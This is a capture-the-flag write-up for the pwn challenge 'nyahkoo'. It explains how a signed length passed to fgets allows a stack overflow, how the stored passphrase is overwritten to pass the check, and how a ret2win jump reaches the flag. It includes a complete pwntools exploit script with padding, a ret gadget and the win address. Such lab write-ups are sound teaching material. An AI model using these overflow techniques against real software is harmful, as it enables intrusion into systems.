# nyahkoo 

Category: PWN
Points: ~980
Solves: 11

Challenge Description:
another russian test i couldn't understand

First blooded :p

Artifact Files:
[chall](./chall)

## Quick overview

This program asks us for a passphrase length at first. Typing a length like 10 chars,
we can then type some text and... We get denied. Obviously our random input wasn't the passphrase.

Alright let's take a look at the code then since this is very little information.

## Code

So the passphrase is loaded in memory from an environment variable :

```asm
│           0x004008cf      c745cc0000..   mov dword [var_34h], 0
│           0x004008d6      bf6a0a4000     mov edi, str.PASSPHRASE     ; 0x400a6a ; "PASSPHRASE" ; const char *name
│           0x004008db      e880fdffff     call sym.imp.getenv         ; char *getenv(const char *name)
│           0x004008e0      4889c2         mov rdx, rax
│           0x004008e3      488d45e0       lea rax, [dest]
│           0x004008e7      4889d6         mov rsi, rdx                ; const char *src
│           0x004008ea      4889c7         mov rdi, rax                ; char *dest
│           0x004008ed      e87efdffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
```

After this the program just takes, exactly like we expected, a number using
`scanf("%d", &n)` and it then actually goes through a check.

The program checks the following condition:
```c
if(0xf < len) {
    puts("too big");
    exit(1);
}
```

Now one thing you'll notice is that this len is considered as a **SIGNED**
integer. Format String is "%d" which takes a signed int allows us to put a 
negative number like -1. 

Since this len input is used inside of fgets as an **UNSIGNED** integer. We can have
a very big overflow on the stack.

Now when we read our passphrase input we could overflow and jump anywhere in the memory
since the program doesn't have PIE.

Now let's search for targets after we get this control of PC.
We can use `readelf -s ./chall` to dump the symbols and we find a function called

**_Z3winv** -> (this is a c++ weird ass name but it basically means the function's called "win")

Now this looks like a basic ret2win challenge. The code of the win function is as follows:

```asm
┌ 16: sym.win__ ();
│           0x00400816      55             push rbp                    ; win()
│           0x00400817      4889e5         mov rbp, rsp
│           0x0040081a      bf580a4000     mov edi, str.cat__app_flag.txt ; 0x400a58 ; "cat /app/flag.txt" ; const char *string
│           0x0040081f      e86cfeffff     call sym.imp.system         ; int system(const char *string)
│           0x00400824      5d             pop rbp
└           0x00400825      c3             ret
```

This seems to just read the flag.txt file so let's try to apply all these ideas we got !

### Exploitation

Now something that I haven't mentionned and only ran into during exploitation
was that the passphrase is actually being checked and the program terminated with
an **exit()** call if we fail to pass that. Luckily for us we can overflow the passphrase in memory
and make it match with our flag input

The idea is pretty simple : 
-> write 15 A's and a Null Byte first to create a known string in the buffer
-> overwrite the passphrase with 15 A's and a Null byte to have it equal to our buffer input

This way the string functions of C will still stop reading at that null byte and we will
have a successful passphrase check.

Putting all of this together we get the following script:

```py
#!/usr/bin/env python3

from pwn import *

context.log_level = 'error'
context.binary = elf = ELF('./chall')
context.terminal = ['alacritty', '-e']

if args.REMOTE:
    io = remote("84.201.137.163", 10186)
else:
    io = process()

io.sendlineafter(b': ', b'-1')

ret = 0x0000000000400641
win = 0x00400816

payload = b'A' * 15 + b'\x00' # overflow buffer
payload += b'A'* 15 + b'\x00' # overflow passphrase to pass check
payload += b'A'*24
payload += pack(ret)
payload += pack(win)

io.sendlineafter(b': ', payload)
io.interactive()
io.close()
```

Note that I had to get a **ret** gadget from memory in order to fix the stack's
alignment and make the win() function call system successfully.

Running this, we get the flag and a first blood during ctf :D

[Back to home](../../README.md)
